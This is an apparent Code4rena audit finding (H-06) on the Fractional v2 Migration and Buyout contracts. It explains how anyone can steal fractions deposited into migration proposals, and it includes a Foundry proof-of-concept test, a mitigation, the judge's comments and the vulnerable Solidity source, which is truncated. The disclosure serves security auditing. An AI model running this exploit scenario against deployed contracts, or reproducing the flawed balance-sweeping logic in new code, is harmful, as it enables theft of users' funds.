{
  "Title": "[H-06] Any fractions deposited into any proposal can be stolen at any time until it is commited",
  "Content": "_Submitted by panprog, also found by 0x52, 0xsanson, hansfriese, shenwilly, and zzzitron_\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L210>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L73>\n\n### Impact\n\nWhen buyout starts, it takes all fractions owned by proposer. This means that when `Migration` contract starts a buyout, it takes all fractions it has, not just the fractions from the proposal. This is easily exploitable by anyone.\n\nStealing fractions scenario:\n\n1.  Bob starts a proposal, deposits `3000` fractions\n2.  Alice immediately starts another proposal with `targetPrice = 0`, deposits `0 fractions` and minimal ether (`value: 1`, which is `10^-18 ether`)\n3.  Since price is larger than targetPrice, Alice immediately commits the proposal\n4.  Buyout is started, but instead of `0 fractions` it has `3000 fractions` from bob, because starting buyout took all `Migration`'s fractions.\n5.  Alice immediately buys `3000 fractions` from buyout for free (`0 ether`).\n6.  At this point Alice has successfully stolen all deposited fractions.\n\n### Proof of Concept\n\nAdd this code to test/Migration.t.sol\n\n    function testPanprogBugH4() public {\n    \tinitializeMigration(alice, bob, 10000, 10000, true);\n\n    \t(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n    \t// Migrate to a vault with no permissions (just to test out migration)\n    \taddress[] memory newModules = new address[](2);\n\n    \tnewModules[0] = migration;\n    \tnewModules[1] = modules[1];\n\n    \t// Bob makes the proposal\n    \tbob.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 2,\n    \t\t10 ether\n    \t);\n    \t// Bob joins the proposal with 3000 fractions\n    \tbob.migrationModule.join{value: 1 ether}(vault, 1, 3000);\n\n    \t// Alice starts a competing proposal (we use bob's data for simplicity)\n    \talice.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 10,\n    \t\t0 ether\n    \t);\n\n    \t// Alice joins her proposal with 0 fractions and minimum allowed ether (for the price to be above target)\n    \talice.migrationModule.join{value: 1}(vault, 2, 0);\n\n    \t// since the target price is reached, alice starts the buyout on her proposal\n    \talice.migrationModule.commit(vault, 2);\n\n    \t// at this point buyout should be empty, but in fact due to bug it has 3000 fractions from bob\n    \t// alice can now buy fractions from buyout for free (it should revert, but it doesn't)\n    \tvm.expectRevert(\n    \t\tabi.encodeWithSelector(IBuyout.InvalidPayment.selector)\n    \t);\n    \talice.buyoutModule.buyFractions(vault, 3000);\n    }\n\n### Recommended Mitigation Steps\n\n`Buyout` `start` function should include amount of fractions a proposer deposits, and `Migration`'s `commit` function should specify correct fractions amount when starting a buyout.\n\n**[stevennevins (Fractional) confirmed](https://github.com/code-423n4/2022-07-fractional-findings/issues/619)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/183#issuecomment-1203228421):**\n > An attacker can steal fractions that have that have been used to join a migration. Agree this is a High risk issue.\n> \n> Making this submission the primary instance for including a coded POC. \n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
  "Code": [
    {
      "filename": "src/modules/Migration.sol",
      "content": "// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {IFERC1155} from \"../interfaces/IFERC1155.sol\";\nimport {IMigration, Proposal} from \"../interfaces/IMigration.sol\";\nimport {IModule} from \"../interfaces/IModule.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {MerkleBase} from \"../utils/MerkleBase.sol\";\nimport {Minter} from \"./Minter.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {ReentrancyGuard} from \"@rari-capital/solmate/src/utils/ReentrancyGuard.sol\";\n\n/// @title Migration\n/// @author Fractional Art\n/// @notice Module contract for vaults to migrate to a new set of permissions\n/// - A fractional holder creates a proposal with a target price and list of modules\n/// - For 7 days, users can contribute their fractions / ether to signal support\n/// - If the target price is reached then a buyout can be triggered and trading\n///   against the proposed buyout price can take place to resolve the outcome\n/// - If a proposal holds more than 51% of the total supply, the buyout succeeds, a new vault can\n///   be created and the underlying assets (ERC-20, ERC-721 and ERC-1155 tokens) can be migrated\ncontract Migration is\n    IMigration,\n    MerkleBase,\n    Minter,\n    Multicall,\n    NFTReceiver,\n    ReentrancyGuard\n{\n    /// @notice Address of Buyout module contract\n    address payable public buyout;\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Counter used to assign IDs to new proposals\n    uint256 public nextId;\n    /// @notice The length for the migration proposal period\n    uint256 public constant PROPOSAL_PERIOD = 7 days;\n    /// @notice Mapping of a vault to it's proposal migration information\n    mapping(address => mapping(uint256 => Proposal)) public migrationInfo;\n    /// @notice Mapping of a proposal ID to a user's ether contribution\n    mapping(uint256 => mapping(address => uint256)) private userProposalEth;\n    /// @notice Mapping of a proposal ID to a user's fractions contribution\n    mapping(uint256 => mapping(address => uint256))\n        private userProposalFractions;\n\n    /// @notice Initializes buyout, registry, and supply contracts\n    constructor(\n        address _buyout,\n        address _registry,\n        address _supply\n    ) Minter(_supply) {\n        buyout = payable(_buyout);\n        registry = _registry;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Proposes a set of modules and plugins to migrate a vault to\n    /// @param _vault Address of the vault\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    /// @param _newFractionSupply New supply of fractional tokens\n    /// @param _targetPrice Target price of the buyout\n    function propose(\n        address _vault,\n        address[] calldata _modules,\n        address[] calldata _plugins,\n        bytes4[] calldata _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Initializes migration proposal info\n        Proposal storage proposal = migrationInfo[_vault][++nextId];\n        proposal.startTime = block.timestamp;\n        proposal.targetPrice = _targetPrice;\n        proposal.modules = _modules;\n        proposal.plugins = _plugins;\n        proposal.selectors = _selectors;\n        proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(\n            _vault\n        );\n        proposal.newFractionSupply = _newFractionSupply;\n    }\n\n    /// @notice Joins a migration proposal by contributing ether and fractional tokens\n    /// @param _vault The address of the vault\n    /// @param _proposalId ID of the proposal being contributed to\n    /// @param _amount Number of fractions being contributed\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable nonReentrant {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates ether balances of the proposal and caller\n        proposal.totalEth += msg.value;\n        userProposalEth[_proposalId][msg.sender] += msg.value;\n        // Deposits fractional tokens into contract\n        IFERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates fraction balances of the proposal and caller\n        proposal.totalFractions += _amount;\n        userProposalFractions[_proposalId][msg.sender] += _amount;\n    }\n\n    /// @notice Leaves a proposed migration with contribution amount\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being left\n    function leave(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n\n        // Gets the migration proposal for the given ID\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        // Updates fraction balances of the proposal and caller\n        uint256 amount = userProposalFractions[_proposalId][msg.sender];\n        proposal.totalFractions -= amount;\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Updates ether balances of the proposal and caller\n        uint256 ethAmount = userProposalEth[_proposalId][msg.sender];\n        proposal.totalEth -= ethAmount;\n        userProposalEth[_proposalId][msg.sender] = 0;\n\n        // Withdraws fractions from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            amount,\n            \"\"\n        );\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(ethAmount);\n    }\n\n    /// @notice Kicks off the buyout process for a migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being committed to\n    /// @return started Bool status of starting the buyout process\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started)\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not inactive\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if migration is passed proposal period\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (block.timestamp > proposal.startTime + PROPOSAL_PERIOD)\n            revert ProposalOver();\n\n        // Calculates current price of the proposal based on total supply\n        uint256 currentPrice = _calculateTotal(\n            100,\n            IVaultRegistry(registry).totalSupply(_vault),\n            proposal.totalEth,\n            proposal.totalFractions\n        );\n\n        // Checks if the current price is greater than target price of the proposal\n        if (currentPrice > proposal.targetPrice) {\n            // Sets token approval to the buyout contract\n            IFERC1155(token).setApprovalFor(address(buyout), id, true);\n            // Starts the buyout process\n            IBuyout(buyout).start{value: proposal.totalEth}(_vault);\n            proposal.isCommited = true;\n            started = true;\n        }\n    }\n\n    /// @notice Settles a migration by ending the buyout\n    /// @dev Succeeds if buyout goes through, fails otherwise\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal being settled\n    function settleVault(address _vault, uint256 _proposalId) external {\n        // Reverts if the migration was not proposed\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (!(proposal.isCommited)) revert NotProposed();\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if the new vault has already been deployed\n        if (proposal.newVault != address(0))\n            revert NewVaultAlreadyDeployed(proposal.newVault);\n\n        // Gets the merkle root for the vault and given proposal ID\n        bytes32[] memory merkleTree = generateMerkleTree(proposal.modules);\n        bytes32 merkleRoot = getRoot(merkleTree);\n        // Deploys a new vault with set permissions and plugins\n        address newVault = IVaultRegistry(registry).create(\n            merkleRoot,\n            proposal.plugins,\n            proposal.selectors\n        );\n        // Sets address of the newly deployed vault\n        proposal.newVault = newVault;\n        // Emits event for settling the new vault\n        emit VaultMigrated(\n            _vault,\n            newVault,\n            _proposalId,\n            proposal.modules,\n            proposal.plugins,\n            proposal.selectors\n        );\n    }\n\n    /// @notice Mints the fractional tokens for a new vault\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _mintProof Merkle proof for minting fractional tokens\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] calldata _mintProof\n    ) external {\n        // Reverts if the migration was unsuccessful\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (current != State.SUCCESS) revert UnsuccessfulMigration();\n        // Reverts if there is no new vault to migrate to\n        Proposal storage proposal = migrationInfo[_vault][_proposalId];\n        if (proposal.newVault == address(0)) revert NoVaultToMigrateTo();\n        // Reverts if fractions of the new vault have already been minted\n        if (proposal.fractionsMigrated) revert NewFractionsAlreadyMinted();\n\n        // Mints initial supply of fractions for the new vault\n        _mintFractions(\n            proposal.newVault,\n            address(this),\n            proposal.newFractionSupply,\n            _mintProof\n        );\n\n        migrationInfo[_vault][_proposalId].fractionsMigrated = true;\n        // Emits event for minting fractional tokens for the new vault\n        emit FractionsMigrated(\n            _vault,\n            proposal.newVault,\n            _proposalId,\n            proposal.newFractionSupply\n        );\n    }\n\n    /// @notice Retrieves ether and fractions deposited from an unsuccessful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the failed proposal\n    function withdrawContribution(address _vault, uint256 _proposalId)\n        external\n    {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if caller has no fractional balance to withdraw\n        (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);\n        if (\n            current != State.INACTIVE ||\n            migrationInfo[_vault][_proposalId].newVault != address(0)\n        ) revert NoContributionToWithdraw();\n\n        // Temporarily store user's fractions for the transfer\n        uint256 userFractions = userProposalFractions[_proposalId][msg.sender];\n        // Updates fractional balance of caller\n        userProposalFractions[_proposalId][msg.sender] = 0;\n        // Withdraws fractional tokens from contract back to caller\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            userFractions,\n            \"\"\n        );\n\n        // Temporarily store user's eth for the transfer\n        uint256 userEth = userProposalEth[_proposalId][msg.sender];\n        // Udpates ether balance of caller\n        userProposalEth[_proposalId][msg.sender] = 0;\n        // Withdraws ether from contract back to caller\n        payable(msg.sender).transfer(userEth);\n    }\n\n    /// @notice Migrates an ERC-20 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-20 token\n    /// @param _amount Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-20 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC20(\n            _vault,\n            _token,\n            newVault,\n            _amount,\n            _erc20TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-721 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-721 token\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC721(\n            _vault,\n            _token,\n            newVault,\n            _tokenId,\n            _erc721TransferProof\n        );\n    }\n\n    /// @notice Migrates an ERC-1155 token to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _id ID of the token\n    /// @param _amount amount to be transferred\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function migrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _id,\n        uint256 _amount,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Withdraws an ERC-1155 token from the old vault and transfers to the new vault\n        IBuyout(buyout).withdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _id,\n            _amount,\n            _erc1155TransferProof\n        );\n    }\n\n    /// @notice Batch migrates multiple ERC-1155 tokens to the new vault after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    /// @param _token Address of the ERC-1155 token\n    /// @param _ids IDs of each token type\n    /// @param _amounts Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for batch transferring multiple ERC-1155 tokens\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256[] calldata _ids,\n        uint256[] calldata _amounts,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        // Batch withdraws multiple ERC-1155 tokens from the old vault and transfers to the new vault\n        IBuyout(buyout).batchWithdrawERC1155(\n            _vault,\n            _token,\n            newVault,\n            _ids,\n            _amounts,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Migrates the caller's fractions from an old vault to a new one after a successful migration\n    /// @param _vault Address of the vault\n    /// @param _proposalId ID of the proposal\n    function migrateFractions(address _vault, uint256 _proposalId) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if buyout state is not successful\n        (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        State required = State.SUCCESS;\n        if (current != required) revert IBuyout.InvalidState(required, current);\n        // Reverts if proposer of buyout is not this contract\n        if (proposer != address(this)) revert NotProposalBuyout();\n\n        // Gets the last total supply of fractions for the vault\n        (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(\n            _vault\n        );\n        // Calculates the total ether amount of a successful proposal\n        uint256 totalInEth = _calculateTotal(\n            1 ether,\n            lastTotalSupply,\n            migrationInfo[_vault][_proposalId].totalEth,\n            migrationInfo[_vault][_proposalId].totalFractions\n        );\n        // Calculates balance of caller based on ether contribution\n        uint256 balanceContributedInEth = _calculateContribution(\n            totalInEth,\n            lastTotalSupply,\n            userProposalEth[_proposalId][msg.sender],\n            userProposalFractions[_proposalId][msg.sender]\n        );\n\n        // Gets the token and fraction ID of the new vault\n        address newVault = migrationInfo[_vault][_proposalId].newVault;\n        (address token, uint256 newFractionId) = IVaultRegistry(registry)\n            .vaultToToken(newVault);\n        // Calculates share amount of fractions for the new vault based on the new total supply\n        uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);\n        uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /\n            totalInEth;\n\n        // Transfers fractional tokens to caller based on share amount\n        IFERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            newFractionId,\n            shareAmount,\n            \"\"\n        );\n    }\n\n    /// @notice Generates the merkle tree of a given proposal\n    /// @param _modules List of module contracts\n    /// @return hashes Combined list of leaf nodes\n    function generateMerkleTree(address[] memory _modules)\n        public\n        view\n        returns (bytes32[] memory hashes)\n    {\n        uint256 treeLength;\n        uint256 modulesLength = _modules.length;\n\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                treeLength += IModule(_modules[i]).getLeafNodes().length;\n            }\n        }\n\n        uint256 counter;\n        hashes = new bytes32[](treeLength);\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();\n                uint256 leavesLength = leaves.length;\n                for (uint256 j; j < leavesLength; ++j) {\n                    hashes[counter++] = leaves[j];\n                }\n            }\n        }\n    }\n\n    /// @notice Calculates the total amount of ether\n    /// @param _scalar Scalar used for multiplication\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _totalEth Total ether balance of the proposal\n    /// @param _totalFractions Total fractional balance of the proposal\n    /// @return Total amount of ether\n    function _calculateTotal(\n        uint256 _scalar,\n        uint256 _lastTotalSupply,\n        uint256 _totalEth,\n        uint256 _totalFractions\n    ) private pure returns (uint256) {\n        return\n            (_totalEth * _scalar) /\n            (_scalar - ((_totalFractions * _scalar) / _lastTotalSupply));\n    }\n\n    /// @notice Calculates the amount of ether contributed by the user\n    /// @param _totalInEth Total amount of ether\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _userProposalEth User balance of ether for the proposal\n    /// @param _userProposalFractions User balance of fractions for the proposal\n    /// @return Total contribution amount\n    function _calculateContribution(\n        uint256 _totalInEth,\n        uint256 _lastTotalSupply,\n        uint256 _userProposalEth,\n        uint256 _userProposalFractions\n    ) private pure returns (uint256) {\n        return\n            _userProposalEth +\n            (_userProposalFractions * _totalInEth) /\n            _lastTotalSupply;\n    }\n}"
    },
    {
      "filename": "src/modules/Buyout.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {ITransfer} from \"../interfaces/ITransfer.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {SafeSend} from \"../utils/SafeSend.sol\";\nimport {SelfPermit} from \"../utils/SelfPermit.sol\";\n\n/// @title Buyout\n/// @author Fractional Art\n/// @notice Module contract for vaults to hold buyout pools\n/// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool.\n/// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether.\n/// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether.\n/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer\n///   gains access to withdraw the underlying assets (ERC20, ERC721, and ERC1155 tokens) from the vault.\n///   Otherwise the buyout is considered unsuccessful and a new one may then begin.\n/// - NOTE: A vault may only have one active buyout at any given time.\n/// - buyoutPrice = (ethDeposit * 100) / (100 - ((fractionDeposit * 100) / totalSupply))\n/// - buyoutShare = (tokenBalance * ethBalance) / (totalSupply + tokenBalance)\ncontract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Address of Supply target contract\n    address public supply;\n    /// @notice Address of Transfer target contract\n    address public transfer;\n    /// @notice Time length of the proposal period\n    uint256 public constant PROPOSAL_PERIOD = 2 days;\n    /// @notice Time length of the rejection period\n    uint256 public constant REJECTION_PERIOD = 4 days;\n    /// @notice Mapping of vault address to auction struct\n    mapping(address => Auction) public buyoutInfo;\n\n    /// @notice Initializes registry, supply, and transfer contracts\n    constructor(\n        address _registry,\n        address _supply,\n        address _transfer\n    ) {\n        registry = _registry;\n        supply = _supply;\n        transfer = _transfer;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Starts the auction for a buyout pool\n    /// @param _vault Address of the vault\n    function start(address _vault) external payable {\n        // Reverts if ether deposit amount is zero\n        if (msg.value == 0) revert ZeroDeposit();\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Gets total supply of fractional tokens for the vault\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        // Gets total balance of fractional tokens owned by caller\n        uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id);\n\n        // Transfers fractional tokens into the buyout pool\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            depositAmount,\n            \"\"\n        );\n\n        // Calculates price of buyout and fractions\n        // @dev Reverts with division error if called with total supply of tokens\n        uint256 buyoutPrice = (msg.value * 100) /\n            (100 - ((depositAmount * 100) / totalSupply));\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n\n        // Sets info mapping of the vault address to auction struct\n        buyoutInfo[_vault] = Auction(\n            block.timestamp,\n            msg.sender,\n            State.LIVE,\n            fractionPrice,\n            msg.value,\n            totalSupply\n        );\n        // Emits event for starting auction\n        emit Start(\n            _vault,\n            msg.sender,\n            block.timestamp,\n            buyoutPrice,\n            fractionPrice\n        );\n    }\n\n    /// @notice Sells fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function sellFractions(address _vault, uint256 _amount) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        // Reverts if auction state is not live\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of proposal period\n        uint256 endTime = startTime + PROPOSAL_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n\n        // Transfers fractional tokens to pool from caller\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n\n        // Updates ether balance of pool\n        uint256 ethAmount = fractionPrice * _amount;\n        buyoutInfo[_vault].ethBalance -= ethAmount;\n        // Transfers ether amount to caller\n        _sendEthOrWeth(msg.sender, ethAmount);\n        // Emits event for selling fractions into pool\n        emit SellFractions(msg.sender, _amount);\n    }\n\n    /// @notice Buys fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function buyFractions(address _vault, uint256 _amount) external payable {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of rejection period\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n        // Reverts if payment amount does not equal price of fractional amount\n        if (msg.value != fractionPrice * _amount) revert InvalidPayment();\n\n        // Transfers fractional tokens to caller\n        IERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates ether balance of pool\n        buyoutInfo[_vault].ethBalance += msg.value;\n        // Emits event for buying fractions from pool\n        emit BuyFractions(msg.sender, _amount);\n    }\n\n    /// @notice Ends the auction for a live buyout pool\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function end(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (\n            uint256 startTime,\n            address proposer,\n            State current,\n            ,\n            uint256 ethBalance,\n\n        ) = this.buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is less than or equal to end time of auction\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp <= endTime)\n            revert TimeNotElapsed(block.timestamp, endTime);\n\n        uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);\n        // Checks totalSupply of auction pool to determine if buyout is successful or not\n        if (\n            (tokenBalance * 1000) /\n                IVaultRegistry(registry).totalSupply(_vault) >\n            500\n        ) {\n            // Initializes vault transaction\n            bytes memory data = abi.encodeCall(\n                ISupply.burn,\n                (address(this), tokenBalance)\n            );\n            // Executes burn of fractional tokens from pool\n            IVault(payable(_vault)).execute(supply, data, _burnProof);\n            // Sets buyout state to successful\n            buyoutInfo[_vault].state = State.SUCCESS;\n            // Emits event for ending successful auction\n            emit End(_vault, State.SUCCESS, proposer);\n        } else {\n            // Deletes auction info\n            delete buyoutInfo[_vault];\n            // Transfers fractions and ether back to proposer of the buyout pool\n            IERC1155(token).safeTransferFrom(\n                address(this),\n                proposer,\n                id,\n                tokenBalance,\n                \"\"\n            );\n            _sendEthOrWeth(proposer, ethBalance);\n            // Emits event for ending unsuccessful auction\n            emit End(_vault, State.INACTIVE, proposer);\n        }\n    }\n\n    /// @notice Cashes out proceeds from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkl"
    }
  ]
}